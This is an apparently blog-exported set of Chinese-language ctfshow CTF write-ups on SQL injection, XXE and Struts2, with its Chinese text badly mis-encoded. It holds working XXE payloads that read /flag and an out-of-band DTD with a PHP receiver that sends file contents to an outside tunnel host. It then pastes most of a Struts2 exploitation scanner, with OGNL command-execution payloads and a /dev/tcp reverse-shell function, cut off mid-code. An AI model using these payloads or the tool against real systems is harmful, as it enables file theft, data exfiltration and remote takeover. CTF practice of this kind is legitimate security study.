<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/search.php?title=1&#x27;;insert into link values(99,&#x27;flag&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.php?id=99</span><br></pre></td></tr></table></figure>

<p>å³å¯çœ‹è§flag</p>
<h2 id="web394-395æœªå†™"><a href="#web394-395æœªå†™" class="headerlink" title="web394,395æœªå†™"></a>web394,395æœªå†™</h2>]]></content>
  </entry>
  <entry>
    <title>ctfshowxxe</title>
    <url>/2023/03/13/ctfshowxxe/</url>
    <content><![CDATA[<p>   xxe</p>
<span id="more"></span>

<p><a href="https://blog.csdn.net/qq_63844103/article/details/128060556?ops_request_misc=%7B%22request_id%22:%22167868664316800182744486%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=167868664316800182744486&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-128060556-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=xxe&spm=1018.2226.3001.4187">(8æ¡æ¶ˆæ¯) ã€webå®‰å…¨ã€‘â€”â€”XXEæ¼æ´å¿«é€Ÿå…¥é—¨_xxeæ¼æ´åˆ©ç”¨_ç™½æ˜¼å®‰å…¨çš„åšå®¢-CSDNåšå®¢</a></p>
<p><strong>å†…éƒ¨å®ä½“å°±ç›¸å½“äºè‡ªå·±ç¼–å†™DTDå†…å®¹ï¼Œè€Œå¤–éƒ¨å®ä½“å°±ç›¸å½“äºå¼•å…¥å¤–éƒ¨çš„DTDå†…å®¹</strong></p>
<p>å¤–éƒ¨å®ä½“:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°å®ä½“çš„<strong>å£°æ˜</strong>ï¼š<code>&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;</code></p>
<p><strong>å¼•ç”¨</strong>å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š<code>%å®ä½“åç§°;</code></p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);   <span class="comment">//$domç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;     <span class="comment">//$credsèŠ‚ç‚¹çš„ctfshow</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>hackbaræ— æ³•ä¼ å‚ï¼Œåªèƒ½bpä¼ å‚,ä¿®æ”¹æ–‡æœ¬é•¿åº¦ï¼Œéšä¾¿é•¿åº¦å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;zhou&gt;   //æ ¹å…ƒç´ </span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;   //å­å…ƒç´    å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š&amp;å®ä½“åç§°</span><br><span class="line">&lt;/zhou&gt;</span><br></pre></td></tr></table></figure>

<p>å…³äºsimplexml_import_dom</p>
<p>simplexml_import_dom() å‡½æ•°æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡ã€‚</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dom = new domDocument;</span><br><span class="line">$dom-&gt;loadXML(&#x27;&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">$xml = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;from;</span><br><span class="line">?&gt;</span><br><span class="line">//è¾“å‡ºï¼šJohn</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;&#x2F;flag        &#x2F;&#x2F;fileåè®®</p>
<p><strong>DOM èŠ‚ç‚¹</strong></p>
<p>æ ¹æ® DOMï¼ŒXML æ–‡æ¡£ä¸­çš„æ¯ä¸ªæˆåˆ†éƒ½æ˜¯ä¸€ä¸ª<strong>èŠ‚ç‚¹</strong>ã€‚</p>
<p>DOM æ˜¯è¿™æ ·è§„å®šçš„ï¼š</p>
<ul>
<li>æ•´ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªæ–‡æ¡£èŠ‚ç‚¹</li>
<li>æ¯ä¸ª XML å…ƒç´ æ˜¯ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹</li>
<li>åŒ…å«åœ¨ XML å…ƒç´ ä¸­çš„æ–‡æœ¬æ˜¯æ–‡æœ¬èŠ‚ç‚¹</li>
<li>æ¯ä¸€ä¸ª XML å±æ€§æ˜¯ä¸€ä¸ªå±æ€§èŠ‚ç‚¹</li>
<li>æ³¨é‡Šæ˜¯æ³¨é‡ŠèŠ‚ç‚¹</li>
</ul>
<h2 id="web374-376"><a href="#web374-376" class="headerlink" title="web374-376"></a>web374-376</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰echo</p>
<p>åœ¨ç½‘ç«™ä¸‹åˆ›å»ºä¸€ä¸ªtest.dtdæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;https://384fb1c7.r2.cpolar.cn/xxe/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªæ¥æ”¶$fileçš„phpæ–‡ä»¶ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://384fb1c7.r2.cpolar.cn/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span>   </span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ‰§è¡Œæˆ‘ç½‘ç«™ä¸‹çš„dtdå†…å®¹æ¥è®¿é—®æˆ‘çš„ç½‘ç«™ï¼Œè·å¾—flag</p>
<p><code>ctfshow&#123;67b34bff-45b9-4935-bfb4-679f7fdd10b4&#125;</code></p>
<p>web375</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p><code>Content-Type: application/xml;charset=utf-8</code></p>
<p>æŠ“åŒ…è¿”å›çœ‹ç±»å‹å¯çŸ¥xmlæäº¤å‚æ•°</p>
<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></p>
<p>å³å¯å›æ˜¾</p>
<p><code>ctfshow&#123;34c67ba7-bb24-4ac1-a485-c0e8c15dc550&#125;</code></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-java</title>
    <url>/2023/04/18/ctfshow-java/</url>
    <content><![CDATA[<p>â€‹    ctfshow-java</p>
 <span id="more"></span>



<p><a href="https://github.com/Vancomycin-g/Struts2Scan">https://github.com/Vancomycin-g/Struts2Scan</a></p>
<p>æ”¹è‰¯ç‰ˆçš„</p>
<p>æˆ–è€…ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import shlex</span><br><span class="line">import random</span><br><span class="line">import base64</span><br><span class="line">import copy</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">import click</span><br><span class="line">import requests</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.error</span><br><span class="line">import time</span><br><span class="line">from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout</span><br><span class="line">from urllib.parse import quote, unquote</span><br><span class="line">from functools import partial</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from concurrent import futures</span><br><span class="line"> </span><br><span class="line">__title__ = &#x27;Struts2 Scan&#x27;</span><br><span class="line">__version__ = &#x27;0.1&#x27;</span><br><span class="line">__author__ = &#x27;HatBoy&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">åŸºäºäº’è”ç½‘ä¸Šå·²ç»å…¬å¼€çš„Structs2é«˜å±æ¼æ´expçš„æ‰«æåˆ©ç”¨å·¥å…·ï¼Œç›®å‰æ”¯æŒçš„æ¼æ´å¦‚ä¸‹ï¼š</span><br><span class="line">S2-001,S2-003,S2-005,S2-007,S2-008,S2-009,S2-012,S2-013,S2-015,S2-016,S2-019,</span><br><span class="line">S2-029,S2-032,S2-033,S2-037,S2-045,S2-046,S2-048,S2-052,S2-053,S2-devMode</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">default_headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"># å…¨å±€ä»£ç†</span><br><span class="line">proxies = None</span><br><span class="line"># è¶…æ—¶æ—¶é—´</span><br><span class="line">_tiemout = 10</span><br><span class="line"># é»˜è®¤è¾“å‡ºæ‰€æœ‰ç»“æœï¼ŒåŒ…æ‹¬ä¸å­˜åœ¨æ¼æ´çš„</span><br><span class="line">is_quiet = False</span><br><span class="line"># è¿›ç¨‹æ•°</span><br><span class="line">process = 10</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GETè¯·æ±‚å‘é€åŒ…è£…&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = get_stream(url, headers, encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_302(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GETè¯·æ±‚å‘é€åŒ…è£…&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=False)</span><br><span class="line">        status_code = html.status_code</span><br><span class="line">        if status_code == 302:</span><br><span class="line">            html = html.headers.get(&quot;Location&quot;, &quot;&quot;)</span><br><span class="line">        elif status_code == 200:</span><br><span class="line">            html = html.content.decode(encoding)</span><br><span class="line">            html = html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">        else:</span><br><span class="line">            html = &quot;&quot;</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_stream(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;åˆ†å—æ¥å—æ•°æ®&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.get(url, headers=headers, timeout=_tiemout, stream=True, proxies=proxies)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            if b&#x27;\x00&#x27; in line:</span><br><span class="line">                break</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;POSTè¯·æ±‚å‘é€åŒ…è£…&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout, files=files)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = post_stream(url, data, headers, encoding, files)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_stream(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;åˆ†å—æ¥å—æ•°æ®&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.post(url, data=data, headers=headers, timeout=_tiemout, stream=True, proxies=proxies,</span><br><span class="line">                              files=None)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def encode_multipart(exp):</span><br><span class="line">    &quot;&quot;&quot;åˆ›å»ºmultipart/form-dataæ•°æ®åŒ…&quot;&quot;&quot;</span><br><span class="line">    boundary = &#x27;----------%s&#x27; % hex(int(time.time() * 1000))</span><br><span class="line">    data = list()</span><br><span class="line">    data.append(&#x27;--%s&#x27; % boundary)</span><br><span class="line">    content = b&#x27;x&#x27;</span><br><span class="line">    decoded_content = content.decode(&#x27;ISO-8859-1&#x27;)</span><br><span class="line">    data.append(&#x27;Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;&#123;exp&#125;&quot;&#x27;.format(exp=exp))</span><br><span class="line">    data.append(&#x27;Content-Type: text/plain\r\n&#x27;)</span><br><span class="line">    data.append(decoded_content)</span><br><span class="line">    data.append(&#x27;--%s--\r\n&#x27; % boundary)</span><br><span class="line">    return &#x27;\r\n&#x27;.join(data), boundary</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_file(url, exp, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;S2-046æ¼æ´ä¸“ç”¨&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        coded_params, boundary = encode_multipart(exp)</span><br><span class="line">        if proxies:</span><br><span class="line">            proxy_support = urllib.request.ProxyHandler(proxies)</span><br><span class="line">            opener = urllib.request.build_opener(proxy_support)</span><br><span class="line">            urllib.request.install_opener(opener)</span><br><span class="line">        req = urllib.request.Request(url, coded_params.encode(&#x27;ISO-8859-1&#x27;))</span><br><span class="line">        req.add_header(&#x27;Content-Type&#x27;, &#x27;multipart/form-data; boundary=%s&#x27; % boundary)</span><br><span class="line">        if headers:</span><br><span class="line">            for key, value in headers.items():</span><br><span class="line">                req.add_header(key, value)</span><br><span class="line">        resp = urllib.request.urlopen(req)</span><br><span class="line">        html = resp.read().decode(encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_cmd(cmd, type=&#x27;string&#x27;):</span><br><span class="line">    &quot;&quot;&quot;å‘½ä»¤è§£æï¼Œå°†è¦æ‰§è¡Œçš„å‘½ä»¤è§£æä¸ºå­—ç¬¦ä¸²æ ¼å¼&quot;&quot;&quot;</span><br><span class="line">    cmd = shlex.split(cmd)</span><br><span class="line">    if type == &#x27;string&#x27;:</span><br><span class="line">        cmd_str = &#x27;&quot;&#x27; + &#x27;&quot;,&quot;&#x27;.join(cmd) + &#x27;&quot;&#x27;</span><br><span class="line">    elif type == &#x27;xml&#x27;:</span><br><span class="line">        cmd_str = &#x27;&lt;string&gt;&#x27; + &#x27;&lt;/string&gt;&lt;string&gt;&#x27;.join(cmd) + &#x27;&lt;/string&gt;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        cmd_str = cmd</span><br><span class="line">    return cmd_str</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_headers(headers):</span><br><span class="line">    &quot;&quot;&quot;å°†headerså­—ç¬¦ä¸²è§£æä¸ºå­—å…¸&quot;&quot;&quot;</span><br><span class="line">    if not headers:</span><br><span class="line">        return default_headers</span><br><span class="line">    new_headers = copy.deepcopy(default_headers)</span><br><span class="line">    headers = headers.split(&#x27;&amp;&#x27;)</span><br><span class="line">    for header in headers:</span><br><span class="line">        header = header.split(&#x27;:&#x27;)</span><br><span class="line">        new_headers[header[0].strip()] = header[1].strip()</span><br><span class="line">    return new_headers</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_hash():</span><br><span class="line">    &quot;&quot;&quot;è·å–éšæœºå­—ç¬¦ä¸²&quot;&quot;&quot;</span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    rand = &#x27;&#x27;.join(random.sample(letters, 10))</span><br><span class="line">    hash = hashlib.md5(rand.encode()).hexdigest()</span><br><span class="line">    return hash</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def echo_check(self):</span><br><span class="line">    &quot;&quot;&quot;é€šè¿‡echoè¾“å‡ºæ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">    hash_str = get_hash()</span><br><span class="line">    html = self.exec_cmd(&quot;echo &quot; + hash_str)</span><br><span class="line">    if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">        return html</span><br><span class="line">    elif hash_str in html:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def reverse_shell(self, ip, port):</span><br><span class="line">    &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">    cmd = &quot;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125;/&#123;port&#125; 0&gt;&amp;1&quot;.format(ip=ip, port=port)</span><br><span class="line">    cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    shell = self.shell.replace(&#x27;SHELL&#x27;, cmd)</span><br><span class="line">    html = self.exec_cmd(shell)</span><br><span class="line">    return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">    if os.path.exists(file_path):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;file&#125;æ–‡ä»¶ä¸å­˜åœ¨!&quot;.format(file=file_path), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_file(file_path, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;è¯»æ–‡ä»¶ï¼Œé»˜è®¤ä½¿ç”¨UTF-8ç¼–ç &quot;&quot;&quot;</span><br><span class="line">    if check_file(file_path):</span><br><span class="line">        with open(file_path, &#x27;r&#x27;, encoding=encoding) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        return data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_urls(file):</span><br><span class="line">    &quot;&quot;&quot;è¯»å–URLæ–‡ä»¶&quot;&quot;&quot;</span><br><span class="line">    if check_file(file):</span><br><span class="line">        with open(file, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">            urls = f.readlines()</span><br><span class="line">        urls = [url.strip() for url in urls if url and url.strip()]</span><br><span class="line">        return urls</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_int(name, t):</span><br><span class="line">    &quot;&quot;&quot;æ£€æŸ¥intå˜é‡&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        t = int(t)</span><br><span class="line">        return t</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] å‚æ•°&#123;name&#125;å¿…é¡»ä¸ºæ•´æ•°!&quot;.format(name=name), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_001:</span><br><span class="line">    &quot;&quot;&quot;S2-001æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-001:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.8; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#x27;%2F&#x27;))%2C%23response.flush()%2C%23response.close()%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if 